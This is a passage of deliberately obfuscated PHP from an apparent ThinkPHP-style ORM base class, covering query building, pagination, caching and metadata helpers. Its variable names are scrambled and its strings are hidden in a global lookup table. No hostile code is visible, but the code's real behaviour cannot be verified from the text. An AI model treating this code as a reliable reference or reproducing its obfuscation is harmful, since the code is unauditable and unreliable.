explode($¬€çòşÔ[50], $‡àÖ“àŸ); return $ÜÒá”½” == $¬€çòşÔ[7] ? in_array($é’ìÌùº, $¨šÂÏê€) : !in_array($é’ìÌùº, $¨šÂÏê€); case $¬€çòşÔ[379]: case $¬€çòşÔ[380]: if (is_array($‡àÖ“àŸ)) { $Ş‰éÇ‹À = $‡àÖ“àŸ[0]; $‡åúÚÛ˜ = $‡àÖ“àŸ[1]; } else { list($Ş‰éÇ‹À, $‡åúÚÛ˜) = explode($¬€çòşÔ[50], $‡àÖ“àŸ); } return $ÜÒá”½” == $¬€çòşÔ[379] ? $é’ìÌùº >= $Ş‰éÇ‹À && $é’ìÌùº <= $‡åúÚÛ˜ : $é’ìÌùº < $Ş‰éÇ‹À || $é’ìÌùº > $‡åúÚÛ˜; case $¬€çòşÔ[381]: case $¬€çòşÔ[382]: return $ÜÒá”½” == $¬€çòşÔ[381] ? $é’ìÌùº == $‡àÖ“àŸ : $é’ìÌùº != $‡àÖ“àŸ; case $¬€çòşÔ[383]: $Ç´¼ª¾ = mb_strlen($é’ìÌùº, $¬€çòşÔ[384]); if (strpos($‡àÖ“àŸ, $¬€çòşÔ[50])) { list($Ş‰éÇ‹À, $‡åúÚÛ˜) = explode($¬€çòşÔ[50], $‡àÖ“àŸ); return $Ç´¼ª¾ >= $Ş‰éÇ‹À && $Ç´¼ª¾ <= $‡åúÚÛ˜; } else { return $Ç´¼ª¾ == $‡àÖ“àŸ; } case $¬€çòşÔ[385]: list($€àç†Ëš, $³İ î®—) = explode($¬€çòşÔ[50], $‡àÖ“àŸ); if (!is_numeric($€àç†Ëš)) { $€àç†Ëš = strtotime($€àç†Ëš); } if (!is_numeric($³İ î®—)) { $³İ î®— = strtotime($³İ î®—); } return NOW_TIME >= $€àç†Ëš && NOW_TIME <= $³İ î®—; case $¬€çòşÔ[386]: return in_array(get_client_ip(), explode($¬€çòşÔ[50], $‡àÖ“àŸ)); case $¬€çòşÔ[387]: return !in_array(get_client_ip(), explode($¬€çòşÔ[50], $‡àÖ“àŸ)); case $¬€çòşÔ[374]: default: return $this->regex($é’ìÌùº, $‡àÖ“àŸ); } } public function query($¯šÏ¦Ş¡, $øÔ†Ü‡Å = false) { $ŒœãÉßê =& $_SERVER[èùÙ¹Ïö]; if (!is_bool($øÔ†Ü‡Å) && !is_array($øÔ†Ü‡Å)) { $øÔ†Ü‡Å = func_get_args(); array_shift($øÔ†Ü‡Å); } $¯šÏ¦Ş¡ = str_replace(array($ŒœãÉßê[248], $ŒœãÉßê[388]), $ŒœãÉßê[53], $¯šÏ¦Ş¡); $¯šÏ¦Ş¡ = $this->parseSql($¯šÏ¦Ş¡, $øÔ†Ü‡Å); return $this->db->query($¯šÏ¦Ş¡); } public function execute($ÕøÌİ¿, $½›¡ÀöŒ = false) { if (!is_bool($½›¡ÀöŒ) && !is_array($½›¡ÀöŒ)) { $½›¡ÀöŒ = func_get_args(); array_shift($½›¡ÀöŒ); } $ÕøÌİ¿ = $this->parseSql($ÕøÌİ¿, $½›¡ÀöŒ); return $this->db->execute($ÕøÌİ¿); } protected function parseSql($¸…•Áé°, $²¤ğ„Î¢) { $§òïüÔ½ =& $_SERVER[èùÙ¹Ïö]; if (!0 === $²¤ğ„Î¢) { $ĞÉ€ë¨Ì = $this->_parseOptions(); $¸…•Áé° = $this->db->parseSql($¸…•Áé°, $ĞÉ€ë¨Ì); } elseif (is_array($²¤ğ„Î¢)) { $²¤ğ„Î¢ = array_map(array($this->db, $§òïüÔ½[389]), $²¤ğ„Î¢); $¸…•Áé° = vsprintf($¸…•Áé°, $²¤ğ„Î¢); } else { $¸…•Áé° = strtr($¸…•Áé°, array($§òïüÔ½[390] => $this->getTableName(), $§òïüÔ½[391] => think_config($§òïüÔ½[290]))); } $this->db->setModel($this->name); return $¸…•Áé°; } public function db($ê„†ô®ı = '', $ù›Ó­ù° = '', $ı¾áÏÓç = array()) { $éº“Ôùı =& $_SERVER[èùÙ¹Ïö]; if ($éº“Ôùı[12] === $ê„†ô®ı && $this->db) { return $this->db; } static $ø²„ = array(); static $ğó¡ßŒÃ = array(); if (!isset($ğó¡ßŒÃ[$ê„†ô®ı]) || isset($ğó¡ßŒÃ[$ê„†ô®ı]) && $ù›Ó­ù° && $ø²„[$ê„†ô®ı] != $ù›Ó­ù°) { if (!empty($ù›Ó­ù°) && is_string($ù›Ó­ù°) && !1 === strpos($ù›Ó­ù°, $éº“Ôùı[8])) { $ù›Ó­ù° = think_config($ù›Ó­ù°); } $ê„†ô®ı = think_guid($ù›Ó­ù°); $ğó¡ßŒÃ[$ê„†ô®ı] = Db::getInstance($ù›Ó­ù°); } elseif (NULL === $ù›Ó­ù°) { $ğó¡ßŒÃ[$ê„†ô®ı]->close(); unset($ğó¡ßŒÃ[$ê„†ô®ı]); return; } if (!empty($ı¾áÏÓç)) { if (is_string($ı¾áÏÓç)) { parse_str($ı¾áÏÓç, $ı¾áÏÓç); } foreach ($ı¾áÏÓç as $‘ÔöáÇÖ => $Ï³êçá¬) { $this->setProperty($‘ÔöáÇÖ, $Ï³êçá¬); } } $ø²„[$ê„†ô®ı] = $ù›Ó­ù°; $this->db = $ğó¡ßŒÃ[$ê„†ô®ı]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¢§…íöö = get_class($this); if ($¢§…íöö == $_SERVER[èùÙ¹Ïö][392]) { return $this->name; } $this->name = substr($¢§…íöö, 0, -5); } return $this->name; } public function getTableName() { $Ô×üœ«« =& $_SERVER[èùÙ¹Ïö]; if (empty($this->trueTableName)) { $å­çÍ•¹ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ô×üœ««[12]; if (!empty($this->tableName)) { $å­çÍ•¹ .= $this->tableName; } else { $å­çÍ•¹ .= think_parse_name($this->name); } $this->trueTableName = strtolower($å­çÍ•¹); } return (!empty($this->dbName) ? $this->dbName . $Ô×üœ««[10] : $Ô×üœ««[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¾ÜËÔÎ  =& $_SERVER[èùÙ¹Ïö]; return isset($this->fields[$¾ÜËÔÎ [297]]) ? $this->fields[$¾ÜËÔÎ [297]] : $this->pk; } public function getDbFields() { $ÁÃÒÈö =& $_SERVER[èùÙ¹Ïö]; if (isset($this->options[$ÁÃÒÈö[325]])) { $£˜ØÜ¾¯ = $this->db->getFields($this->options[$ÁÃÒÈö[325]]); return $£˜ØÜ¾¯ ? array_keys($£˜ØÜ¾¯) : !1; } if ($this->fields) { $£˜ØÜ¾¯ = $this->fields; unset($£˜ØÜ¾¯[$ÁÃÒÈö[296]], $£˜ØÜ¾¯[$ÁÃÒÈö[297]], $£˜ØÜ¾¯[$ÁÃÒÈö[298]], $£˜ØÜ¾¯[$ÁÃÒÈö[295]]); return $£˜ØÜ¾¯; } return !1; } public function data($ÃêÇ°ª› = '') { $¦Õ³³Öƒ =& $_SERVER[èùÙ¹Ïö]; if ($¦Õ³³Öƒ[12] === $ÃêÇ°ª› && !empty($this->data)) { return $this->data; } if (is_object($ÃêÇ°ª›)) { $ÃêÇ°ª› = get_object_vars($ÃêÇ°ª›); } elseif (is_string($ÃêÇ°ª›)) { parse_str($ÃêÇ°ª›, $ÃêÇ°ª›); } elseif (!is_array($ÃêÇ°ª›)) { think_exception(think_lang($¦Õ³³Öƒ[317])); } $this->data = $ÃêÇ°ª›; return $this; } public function join($á½è¾Ò¶) { $ñÙ€á› =& $_SERVER[èùÙ¹Ïö]; if (is_array($á½è¾Ò¶)) { $this->options[$ñÙ€á›[328]] = $á½è¾Ò¶; } elseif (!empty($á½è¾Ò¶)) { $this->options[$ñÙ€á›[328]][] = $á½è¾Ò¶; } return $this; } public function union($ĞåÉï—ú, $¼›¹ªÅÌ = false) { $’ëÇ™Ã =& $_SERVER[èùÙ¹Ïö]; if (empty($ĞåÉï—ú)) { return $this; } if ($¼›¹ªÅÌ) { $this->options[$’ëÇ™Ã[393]][$’ëÇ™Ã[394]] = !0; } if (is_object($ĞåÉï—ú)) { $ĞåÉï—ú = get_object_vars($ĞåÉï—ú); } if (is_string($ĞåÉï—ú)) { $İÕÈ¾²Ï = $ĞåÉï—ú; } elseif (is_array($ĞåÉï—ú)) { if (isset($ĞåÉï—ú[0])) { $this->options[$’ëÇ™Ã[393]] = array_merge($this->options[$’ëÇ™Ã[393]], $ĞåÉï—ú); return $this; } else { $İÕÈ¾²Ï = $ĞåÉï—ú; } } else { think_exception(think_lang($’ëÇ™Ã[317])); } $this->options[$’ëÇ™Ã[393]][] = $İÕÈ¾²Ï; return $this; } public function cache($Àï»î® = true, $¯”éÊêÈ = null, $šÂŞ×«û = '') { $Ä¥ì´¦Ú =& $_SERVER[èùÙ¹Ïö]; if (!1 !== $Àï»î®) { $this->options[$Ä¥ì´¦Ú[395]] = array($Ä¥ì´¦Ú[96] => $Àï»î®, $Ä¥ì´¦Ú[385] => $¯”éÊêÈ, $Ä¥ì´¦Ú[33] => $šÂŞ×«û); } return $this; } public function field($—®ëİ, $½ÊÑ²ò = false) { $³Ù‰ò¨ =& $_SERVER[èùÙ¹Ïö]; if (!0 === $—®ëİ) { $Ò¸èââ® = $this->getDbFields(); $—®ëİ = $Ò¸èââ® ? $Ò¸èââ® : $³Ù‰ò¨[205]; } elseif ($½ÊÑ²ò) { if (is_string($—®ëİ)) { $—®ëİ = explode($³Ù‰ò¨[50], $—®ëİ); } $Ò¸èââ® = $this->getDbFields(); $—®ëİ = $Ò¸èââ® ? array_diff($Ò¸èââ®, $—®ëİ) : $—®ëİ; } $this->options[$³Ù‰ò¨[319]] = $—®ëİ; return $this; } public function scope($Âì›¤É‰ = '', $şŠçÌøã = NULL) { $šêĞÚıÇ =& $_SERVER[èùÙ¹Ïö]; if ($šêĞÚıÇ[12] === $Âì›¤É‰) { if (isset($this->_scope[$šêĞÚıÇ[37]])) { $ÉÏ¹‚™ã = $this->_scope[$šêĞÚıÇ[37]]; } else { return $this; } } elseif (is_string($Âì›¤É‰)) { $ÍÄ‹‹ÑÓ = explode($šêĞÚıÇ[50], $Âì›¤É‰); $ÉÏ¹‚™ã = array(); foreach ($ÍÄ‹‹ÑÓ as $±–ìÛÀ­) { if (!isset($this->_scope[$±–ìÛÀ­])) { continue; } $ÉÏ¹‚™ã = array_merge($ÉÏ¹‚™ã, $this->_scope[$±–ìÛÀ­]); } if (!empty($şŠçÌøã) && is_array($şŠçÌøã)) { $ÉÏ¹‚™ã = array_merge($ÉÏ¹‚™ã, $şŠçÌøã); } } elseif (is_array($Âì›¤É‰)) { $ÉÏ¹‚™ã = $Âì›¤É‰; } if (is_array($ÉÏ¹‚™ã) && !empty($ÉÏ¹‚™ã)) { $this->options = array_merge($this->options, array_change_key_case($ÉÏ¹‚™ã)); } return $this; } public function where($çãáÍ–, $˜òş»¤š = null) { $ŒôÆıî„ =& $_SERVER[èùÙ¹Ïö]; if (!is_null($˜òş»¤š) && is_string($çãáÍ–)) { if (!is_array($˜òş»¤š)) { $˜òş»¤š = func_get_args(); array_shift($˜òş»¤š); } $˜òş»¤š = array_map(array($this->db, $ŒôÆıî„[389]), $˜òş»¤š); $çãáÍ– = vsprintf($çãáÍ–, $˜òş»¤š); } elseif (is_object($çãáÍ–)) { $çãáÍ– = get_object_vars($çãáÍ–); } elseif (is_array($çãáÍ–)) { foreach ($çãáÍ– as $–õ†½‹ä => $Ê‰¾®º‚) { if ((is_numeric($–õ†½‹ä) || !$–õ†½‹ä) && is_string($Ê‰¾®º‚)) { if (strpos($Ê‰¾®º‚, $ŒôÆıî„[396]) === 0) { continue; } think_trace($ŒôÆıî„[397], $ŒôÆıî„[12], $ŒôÆıî„[49]); die; } } } if (is_string($çãáÍ–) && $ŒôÆıî„[12] != $çãáÍ–) { $ùÆıÛ¢µ = array(); $ùÆıÛ¢µ[$ŒôÆıî„[398]] = $çãáÍ–; $çãáÍ– = $ùÆıÛ¢µ; } if (isset($this->options[$ŒôÆıî„[321]])) { $this->options[$ŒôÆıî„[321]] = array_merge($this->options[$ŒôÆıî„[321]], $çãáÍ–); } else { $this->options[$ŒôÆıî„[321]] = $çãáÍ–; } return $this; } public function limit($ ¡´Ü­³, $ëÌëœİ‹ = null) { $Ÿ ¤¾„ =& $_SERVER[èùÙ¹Ïö]; $this->options[$Ÿ ¤¾„[338]] = is_null($ëÌëœİ‹) ? $ ¡´Ü­³ : $ ¡´Ü­³ . $Ÿ ¤¾„[50] . $ëÌëœİ‹; return $this; } public function page($î¸Õûƒ€, $»¶Ü—° = null) { $ËĞßŞí¡ =& $_SERVER[èùÙ¹Ïö]; $this->options[$ËĞßŞí¡[399]] = is_null($»¶Ü—°) ? $î¸Õûƒ€ : $î¸Õûƒ€ . $ËĞßŞí¡[50] . $»¶Ü—°; return $this; } public function comment($…“‡Ğ©) { $this->options[$_SERVER[èùÙ¹Ïö][400]] = $…“‡Ğ©; return $this; } public function setProperty($²·Ï¼şÊ, $¿Õóî«ä) { if (property_exists($this, $²·Ï¼şÊ)) { $this->{$²·Ï¼şÊ} = $¿Õóî«ä; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\164\x2c\x75\x70\144\x61\x74\145", "\x66\165\156\x63\x74\x69\157\x6e"), array("\143\162\145\141\x74\145\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\164", "\146\x75\156\x63\164\151\x6f\156")); public function setDataAuto($ÃåîÀ…Ø) { $this->dataAuto = $ÃåîÀ…Ø; } public function __construct($ïÍÊ˜À = '', $Û×¯«…« = '', $øş·‚›Œ = '') { parent::__construct($ïÍÊ˜À, $Û×¯«…«, $øş·‚›Œ); } protected $tableMeta = array(); protected function _beforeInsert(&$¨ã²Ÿ¡İ, $Ö©Èè•ï) { $‚ôŠüê² =& $_SERVER[èùÙ¹Ïö]; if (!$this->checkDataAutoHas($‚ôŠüê²[401])) { return; } $this->dataBeforeFilter($¨ã²Ÿ¡İ, $‚ôŠüê²[401]); } protected function _beforeUpdate(&$É°Ì÷¬Ô, $‡ô•¿) { $ëÔ’¯ÄÜ =& $_SERVER[èùÙ¹Ïö]; if (!$this->checkDataAutoHas($ëÔ’¯ÄÜ[402])) { return; } $this->dataBeforeFilter($É°Ì÷¬Ô, $ëÔ’¯ÄÜ[402]); } protected function _afterSelect(&$ÕèãÄ¥, $è‘á‘ø) { if (!is_array($ÕèãÄ¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[èùÙ¹Ïö][403])) { return; } foreach ($ÕèãÄ¥ as &$òšŞŠÈ¥) { $this->dataAfterFilter($òšŞŠÈ¥); } unset($òšŞŠÈ¥); } protected function _afterFind(&$æİŞºÅÑ, $âÊ¸ÑãŸ) { if (!is_array($æİŞºÅÑ)) { return; } if (!$this->checkDataAutoHas($_SERVER[èùÙ¹Ïö][403])) { return; } $this->dataAfterFilter($æİŞºÅÑ); } public static function textEncode($¦åøö§…) { if (!$¦åøö§…) { return $¦åøö§…; } $”«‚¼«ø = json_encode($¦åøö§…); $”«‚¼«ø = preg_replace_callback($_SERVER[èùÙ¹Ïö][404], function ($ıı‚¡Ï³) { return addslashes($ıı‚¡Ï³[0]); }, $”«‚¼«ø); return json_decode($”«‚¼«ø); } public static function textDecode($Ó–Ò¬­ì) { $ä²¯äšß =& $_SERVER[èùÙ¹Ïö]; $»ƒ£¥û = json_encode($Ó–Ò¬­ì); $»ƒ£¥û = preg_replace_callback($ä²¯äšß[405], function ($ÔàÑúÜŞ) { return $_SERVER[èùÙ¹Ïö][99]; }, $»ƒ£¥û); return json_decode($»ƒ£¥û); } public function setAutoIncrement($‹š¥Ù¤) { $†±Î¿è¥ = array($this->getPk() => $‹š¥Ù¤); $‘åõ•ãà = $this->data($†±Î¿è¥)->add(); if ($‘åõ•ãà) { $this->delete($‘åõ•ãà); } } public function getAutoIncrement() { $öØ„‘ô• = $this->getTableName(); $ø¦ßÆç¤ = $this->max($this->getPk()); $ò˜ÛÚê = $this->query("\x73\150\x6f\167\40\164\x61\142\154\145\x20\x73\164\x61\x74\x75\x73\x20\x77\150\145\x72\145\40\116\x61\155\145\x3d\47{$öØ„‘ô•}\47"); $ú†Úã³ = $ò˜ÛÚê[0][$_SERVER[èùÙ¹Ïö][406]]; $‰ëÎ÷¹’ = max($ø¦ßÆç¤, $ú†Úã³); return $‰ëÎ÷¹’; } protected function _callBefore($æïÏµ÷, $ÓÃ„Èâò) { return $this->cacheCallCheck($æïÏµ÷, $ÓÃ„Èâò, !1); } protected function _callAfter($şÌºƒ­, $ÙáÖœ€„) { return $this->cacheCallCheck($şÌºƒ­, $ÙáÖœ€„, !0); } protected function cacheFunctionAlias($ß•­‰´ß) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ĞÃ¨›ö, $È´ºƒ´Ÿ, $òşóáà³ = false) { $à‘Ö’ØÑ = $this->cacheFunctionAlias($È´ºƒ´Ÿ); if (!$à‘Ö’ØÑ) { return; } foreach ($à‘Ö’ØÑ as $íåª»¹Õ => $ğ­½’øÎ) { $ºĞ‚Ó¹ = $ğ­½’øÎ[0]; $€Û’Î·ù = explode($_SERVER[èùÙ¹Ïö][50], $ğ­½’øÎ[1]); if ($ĞÃ¨›ö == $íåª»¹Õ) { return $this->cacheFunctionGet($íåª»¹Õ, $ºĞ‚Ó¹); } if ($òşóáà³ && in_array($ĞÃ¨›ö, $€Û’Î·ù)) { $this->cacheFunctionClear($íåª»¹Õ, $ºĞ‚Ó¹); } } } public function cacheFunctionGet($…¬ã¶’», $âôÇª) { $ùÒú¥”ß = $this->cacheKeyMake($…¬ã¶’», $âôÇª); $åŸÉ¸À = Cache::get($ùÒú¥”ß); if (!is_array($åŸÉ¸À)) { $åŸÉ¸À = call_user_func_array(array($this, $…¬ã¶’»), array($âôÇª, !0)); Cache::set($ùÒú¥”ß, $åŸÉ¸À); } return $åŸÉ¸À; } public function cacheFunctionClear($ññËŞòá, $»‹È´£Å) { $–ÁëûÈß = $»‹È´£Å; if (!is_array($»‹È´£Å)) { $–ÁëûÈß = array($»‹È´£Å); } foreach ($–ÁëûÈß as $šŞİæç) { $ËÚ¯ƒüê = $this->cacheKeyMake($ññËŞòá, $šŞİæç); Cache::remove($ËÚ¯ƒüê); } } private function cacheKeyMake($å“ÃÊ±Û, $àïŞíÚÕ) { $ÜóˆúñÀ =& $_SERVER[èùÙ¹Ïö]; return get_class($this) . $ÜóˆúñÀ[11] . $å“ÃÊ±Û . $ÜóˆúñÀ[407] . $àïŞíÚÕ; } protected function selectPageReset() { $ä«ãß„¥ =& $_SERVER[èùÙ¹Ïö]; if (isset($GLOBALS[$ä«ãß„¥[408]])) { return; } $GLOBALS[$ä«ãß„¥[408]] = isset($GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[409]]) ? $GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[409]] : !1; $GLOBALS[$ä«ãß„¥[410]] = isset($GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[399]]) ? $GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[399]] : !1; $GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[409]] = !1; $GLOBALS[$ä«ãß„¥[7]][$ä«ãß„¥[399]] = !1; } protected function selectPageRestore() { $²ĞïÃÍ› =& $_SERVER[èùÙ¹Ïö]; if (!isset($GLOBALS[$²ĞïÃÍ›[408]])) { return; } $GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[409]] = $GLOBALS[$²ĞïÃÍ›[408]]; $GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[399]] = $GLOBALS[$²ĞïÃÍ›[410]]; if ($GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[409]] === !1) { unset($GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[409]]); } if ($GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[399]] === !1) { unset($GLOBALS[$²ĞïÃÍ›[7]][$²ĞïÃÍ›[399]]); } unset($GLOBALS[$²ĞïÃÍ›[408]]); unset($GLOBALS[$²ĞïÃÍ›[410]]); } protected function selectPage($°¹·êó— = 200, $™çÎêŒ¶ = 1) { $„¢¬ãáª =& $_SERVER[èùÙ¹Ïö]; global $in; $”ÈıŞª° = $this->optionsValue(); $¶íö®‘¡ = 50000; $°¹·êó— = isset($in[$„¢¬ãáª[409]]) && $in[$„¢¬ãáª[409]] ? $in[$„¢¬ãáª[409]] : $°¹·êó—; if ($°¹·êó— === -1) { $in[$„¢¬ãáª[409]] = !1; $¶íö®‘¡ = 100000000; $°¹·êó— = $¶íö®‘¡; } $àíˆ—× = $”ÈıŞª°; $àíˆ—×[$„¢¬ãáª[411]] = array(); $°¹·êó— = intval($°¹·êó—); $°¹·êó— = $°¹·êó— <= 5 ? 5 : ($°¹·êó— >= $¶íö®‘¡ ? $¶íö®‘¡ : $°¹·êó—); $™çÎêŒ¶ = intval(isset($in[$„¢¬ãáª[399]]) && $in[$„¢¬ãáª[399]] ? $in[$„¢¬ãáª[399]] : $™çÎêŒ¶); $™çÎêŒ¶ = $™çÎêŒ¶ <= 1 ? 1 : $™çÎêŒ¶; $“³À®Ÿ¶ = array(); $åÇ°¯î÷ = 1; if ($™çÎêŒ¶ == 1 && $åÇ°¯î÷) { $this->optionsValue($”ÈıŞª°); $“³À®Ÿ¶ = $this->page($™çÎêŒ¶, $°¹·êó—)->select(); $Š ¹¡Í¡ = is_array($“³À®Ÿ¶) ? count($“³À®Ÿ¶) : 0; if ($Š ¹¡Í¡ < $°¹·êó—) { $¤ÚÖ’´ê = 1; } else { $this->optionsValue($àíˆ—×); $Š ¹¡Í¡ = intval($this->count()); $¤ÚÖ’´ê = ceil($Š ¹¡Í¡ / $°¹·êó—); } } else { $this->optionsValue($àíˆ—×); $Š ¹¡Í¡ = intval($this->count()); $¤ÚÖ’´ê = ceil($Š ¹¡Í¡ / $°¹·êó—); $™çÎêŒ¶ = $™çÎêŒ¶ >= $¤ÚÖ’´ê ? $¤ÚÖ’´ê : $™çÎêŒ¶; $this->optionsValue($”ÈıŞª°); $“³À®Ÿ¶ = $this->page($™çÎêŒ¶, $°¹·êó—)->select(); } if (!is_array($“³À®Ÿ¶)) { $“³À®Ÿ¶ = array(); } if ($¤ÚÖ’´ê == 1) { $Š ¹¡Í¡ = count($“³À®Ÿ¶); } $é£ÅŠ¿ã = array($„¢¬ãáª[412] => array($„¢¬ãáª[413] => $Š ¹¡Í¡, $„¢¬ãáª[409] => $°¹·êó—, $„¢¬ãáª[399] => $™çÎêŒ¶, $„¢¬ãáª[414] => $¤ÚÖ’´ê), $„¢¬ãáª[415] => $“³À®Ÿ¶); return $é£ÅŠ¿ã; } protected function checkLength($¡ùÇ¹¼ë, $ßÁç–­ = 0, $ô¾†”áö = '') { $İù§å¤ =& $_SERVER[èùÙ¹Ïö]; $ßÁç–­ = $ßÁç–­ ? $ßÁç–­ : 65536; if (!$¡ùÇ¹¼ë || strlen($¡ùÇ¹¼ë) < $ßÁç–­) { return; } $ô¾†”áö = $ô¾†”áö ? $ô¾†”áö . $İù§å¤[73] : $İù§å¤[12]; show_json($ô¾†”áö . LNG($İù§å¤[416]) . "\50{$ßÁç–­}\x29", !1); } protected function metaSet($ŒÁìÇ, $²»»ê©½ = null, $‡üÈÄ˜ = null) { $§Ó¬÷– =& $_SERVER[èùÙ¹Ïö]; if (!$this->tableMeta || !$ŒÁìÇ) { return !1; } $ºº›³¡ = $this->tableMeta[$§Ó¬÷–[417]]; $ĞóïŸÃ = $this->tableMeta[$§Ó¬÷–[418]]; $¢–ÇŠÀ” = Model($ĞóïŸÃ); $É”‡îé¬ = array($ºº›³¡ => $ŒÁìÇ, $§Ó¬÷–[419] => $²»»ê©½); if (is_null($²»»ê©½)) { return $¢–ÇŠÀ”->where(array($ºº›³¡ => $ŒÁìÇ))->delete(); } if (is_null($‡üÈÄ˜) && is_string($²»»ê©½)) { return $¢–ÇŠÀ”->where($É”‡îé¬)->delete(); } $¨—áê¥‘ = is_array($²»»ê©½) ? $²»»ê©½ : array(); if (is_string($²»»ê©½)) { $¨—áê¥‘[$²»»ê©½] = $‡üÈÄ˜; } $„æşœæ¢ = array(); foreach ($¨—áê¥‘ as $»ëµŒ‘ => $ñº÷’Á) { if (is_null($ñº÷’Á) && is_string($»ëµŒ‘)) { $¢–ÇŠÀ”->where(array($ºº›³¡ => $ŒÁìÇ, $§Ó¬÷–[419] => $»ëµŒ‘))->delete(); continue; } $this->checkLength($ñº÷’Á, !1, $ĞóïŸÃ . $§Ó¬÷–[4] . $»ëµŒ‘); $„æşœæ¢[] = array($ºº›³¡ => $ŒÁìÇ, $§Ó¬÷–[96] => $»ëµŒ‘, $§Ó¬÷–[420] => $ñº÷’Á); } $æŒ¡Û© = $§Ó¬÷–[421] . $ĞóïŸÃ; CacheLock::lock($æŒ¡Û©); $¢–ÇŠÀ”->where(array($ºº›³¡ => $ŒÁìÇ))->addAll($„æşœæ¢, array(), !0); CacheLock::unlock($æŒ¡Û©); return !0; } public function metaGet($å ´—¨Ê, $ŠÎØº” = false) { $ŸßÔì =& $_SERVER[èùÙ¹Ïö]; if (!$this->tableMeta) { return array(); } $¿ˆĞËê = $this->tableMeta[$ŸßÔì[417]]; $æÑÆæ‚ = Model($this->tableMeta[$ŸßÔì[418]]); if ($ŠÎØº”) { $²óş·¥´ = array($¿ˆĞËê => $å ´—¨Ê, $ŸßÔì[96] => $ŠÎØº”); return $æÑÆæ‚->where($²óş·¥´)->getField($ŸßÔì[420]); } $²óş·¥´ = array($¿ˆĞËê => $å ´—¨Ê); $Áò×Å»€ = $æÑÆæ‚->field($ŸßÔì[422])->where($²óş·¥´)->select(); $Áò×Å»€ = array_to_keyvalue($Áò×Å»€, $ŸßÔì[96], $ŸßÔì[420]); return $Áò×Å»€; } private function checkDataAutoHas($ÆƒÅí×«) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ôï™©›Œ) { if (in_array($ÆƒÅí×«, explode($_SERVER[èùÙ¹Ïö][50], $Ôï™©›Œ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$áä÷‡ÏÑ, $Ü°åÂÀõ) { $‘ìî®ï¨ =& $_SERVER[èùÙ¹Ïö]; if (!is_array($áä÷‡ÏÑ)) { return; } foreach ($this->dataAuto as $áÍîüšÍ) { $¬•Ùéú = $áÍîüšÍ[0]; if (!in_array($Ü°åÂÀõ, explode($‘ìî®ï¨[50], $áÍîüšÍ[2]))) { continue; } switch (trim($áÍîüšÍ[3])) { case $‘ìî®ï¨[367]: case $‘ìî®ï¨[368]: $®‚›Šœ“ = $áÍîüšÍ[1]; $ ÄÄç“Ë = isset($áÍîüšÍ[4]) ? (array) $áÍîüšÍ[4] : array(); if ($®‚›Šœ“ == $‘ìî®ï¨[196] && array_key_exists($¬•Ùéú, $áä÷‡ÏÑ)) { if (!$áä÷‡ÏÑ[$¬•Ùéú]) { unset($áä÷‡ÏÑ[$¬•Ùéú]); } break; } if (isset($áä÷‡ÏÑ[$¬•Ùéú])) { array_unshift($ ÄÄç“Ë, $áä÷‡ÏÑ[$¬•Ùéú]); } if ($‘ìî®ï¨[367] == $áÍîüšÍ[3]) { $áä÷‡ÏÑ[$¬•Ùéú] = call_user_func_array($®‚›Šœ“, $ ÄÄç“Ë); } else { $áä÷‡ÏÑ[$¬•Ùéú] = call_user_func_array(array(&$this, $®‚›Šœ“), $ ÄÄç“Ë); } break; case $‘ìî®ï¨[316]: if (isset($áä÷‡ÏÑ[$¬•Ùéú]) && $áä÷‡ÏÑ[$¬•Ùéú]) { $áä÷‡ÏÑ[$¬•Ùéú] = call_user_func_array(array(&$this, $áÍîüšÍ[1]), array($áä÷‡ÏÑ[$¬•Ùéú])); } break; case $‘ìî®ï¨[319]: $áä÷‡ÏÑ[$¬•Ùéú] = $áä÷‡ÏÑ[$áÍîüšÍ[1]]; break; case $‘ìî®ï¨[340]: if (isset($áä÷‡ÏÑ[$¬•Ùéú]) && !is_string($áä÷‡ÏÑ[$¬•Ùéú])) { $áä÷‡ÏÑ[$¬•Ùéú] = json_encode_force($áä÷‡ÏÑ[$¬•Ùéú]); } break; case $‘ìî®ï¨[369]: if ($áä÷‡ÏÑ[$¬•Ùéú] === $‘ìî®ï¨[12]) { unset($áä÷‡ÏÑ[$¬•Ùéú]); } break; case $‘ìî®ï¨[370]: $áä÷‡ÏÑ[$¬•Ùéú] = $áÍîüšÍ[1]; default: break; } } if ($Ü°åÂÀõ == $‘ìî®ï¨[401]) { $Š‡ÜËõ¥ = strtolower($this->db->getDbType()); if (strpos($Š‡ÜËõ¥, $‘ìî®ï¨[13]) !== 0) { return; } $Û½‚´Ô¹ = $this->field(!0)->fields; $À£Ÿø = $Û½‚´Ô¹[$‘ìî®ï¨[298]]; if (isset($Û½‚´Ô¹[$‘ìî®ï¨[297]])) { unset($À£Ÿø[$Û½‚´Ô¹[$‘ìî®ï¨[297]]]); } foreach ($À£Ÿø as $É­è üş => $Ü°åÂÀõ) { if (!isset($áä÷‡ÏÑ[$É­è üş])) { $áä÷‡ÏÑ[$É­è üş] = 